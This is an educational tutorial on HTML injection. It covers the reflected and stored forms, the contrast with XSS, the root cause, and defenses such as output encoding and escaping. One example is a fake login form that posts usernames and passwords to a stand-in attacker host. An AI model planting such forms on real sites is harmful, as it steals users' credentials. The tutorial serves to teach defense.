# HTML Injection

HTML injection is a web vulnerability that occurs when a website takes user-controlled input and inserts it into a page as HTML without properly encoding or sanitizing it.

Normally, when a user enters text into a website, the application should treat that input as data. If the application instead allows the browser to interpret the input as HTML markup, the user may be able to change the structure or appearance of the page.

For example, imagine a page that asks the user for a display name:

```text
Name: [ Ege ]
```

After submitting the form, the page might display:

>Welcome, Ege!

If the application directly inserts that input into the HTML response, a user could instead enter:

```text
Name: [ `<h1>Big Boss</h1>` ]
```

Rather than displaying the tags as text, the browser may interpret them as HTML. The rendered page could then look like:

>Welcome, <h1>Big Boss</h1>

This means the application is not clearly separating data supplied by the user from HTML written by the developer.


## Reflected HTML Injection

In reflected HTML injection, the injected content is included in the server's response but is not permanently stored by the application.

For example, imagine a search page that normally displays:

> You searched for:
>
> ducks

Here, `ducks` comes from a search parameter in the URL:

```
https://ducks.example/search?q=ducks
```

If the application inserts that parameter directly into the HTML response without safely encoding it, an attacker could instead supply HTML:

```
https://ducks.example/search?q=<h2>No results found</h2>
```

The vulnerable page might then render:

> You searched for: 
>
> ## No results found

The malicious HTML is ***reflected*** back in the response to that request rather than permanently saved by the website.

An attacker could prepare a specially crafted URL and send it to another user. If the victim opens it, the vulnerable website itself renders the attacker's HTML. This can make misleading content appear to come from a website the victim already trusts.

For that reason, reflected HTML injection can be useful in phishing and social-engineering attacks.


## Stored HTML Injection

Stored HTML injection occurs when malicious HTML is saved by the application and later shown to other users.

Possible locations include profile descriptions, comments, forum posts, product reviews, and support messages.

For example, if a comment system stores the following input without sanitizing it:

```
<h2>Important Security Notice</h2>
```

every user who visits the page could see the injected heading.

Stored injection can therefore affect many users without requiring each victim to open a specially crafted URL.


## What Could an Attacker Do With HTML Injection?

HTML injection does not necessarily allow an attacker to execute JavaScript. However, changing the HTML of a page can still be dangerous. An attacker may be able to insert misleading text or warnings, add links to malicious websites, imitate legitimate parts of the website, visually modify the page, and create fake login or information forms. 

For example, an attacker might inject something resembling a login form:

```html
<form action="https://attacker.example/collect" method="POST">
    <label>Username:</label>
    <input type="text" name="username">

    <label>Password:</label>
    <input type="password" name="password">

    <button type="submit">Log in</button>
</form>
```

When the browser interprets that HTML, the victim would see an ordinary-looking login form on the vulnerable website.

If a victim believes that the form belongs to the legitimate website and submits it, the information could instead be sent somewhere controlled by the attacker. This is why a vulnerability does not always need to execute code to be useful to an attacker and that simply changing what the user sees can be enough.


## HTML Injection vs. XSS

HTML injection and Cross-Site Scripting (XSS) are related.

With HTML injection, the attacker can inject HTML markup that changes the content or structure of the page.

With XSS, the attacker is able to execute JavaScript in the context of the vulnerable website.

For example:

```
<h1>Fake Warning</h1>
```

is HTML injection. Something such as a working injected `<script>` element would cross into XSS because JavaScript is being executed.


## Why Does It Happen?

The underlying problem is usually that the application trusts user input too much.

Let's consider code that conceptually does this:

```
page = "<p>Hello " + user_input + "</p>"
```

If `user_input` contains HTML tags, those tags may become part of the final document, like the `No results found` example. A safer application should make sure that characters such as `<` and `>` are treated as literal strings when HTML is not intentionally allowed.

For example:

```
&lt;h1&gt;Hello!&lt;/h1&gt;
```

is displayed to the user as:

```
<h1>Hello!</h1>
```

instead of being interpreted as an actual heading. This is what we want.


## Preventing HTML Injection

The main defense is to avoid the insertion of untrusted input directly into HTML. Applications should use measures such as output encoding, context-aware escaping, input sanitization when some HTML must be allowed, templating frameworks that escape variables automatically, and allowlists for permitted HTML elements and attributes. 
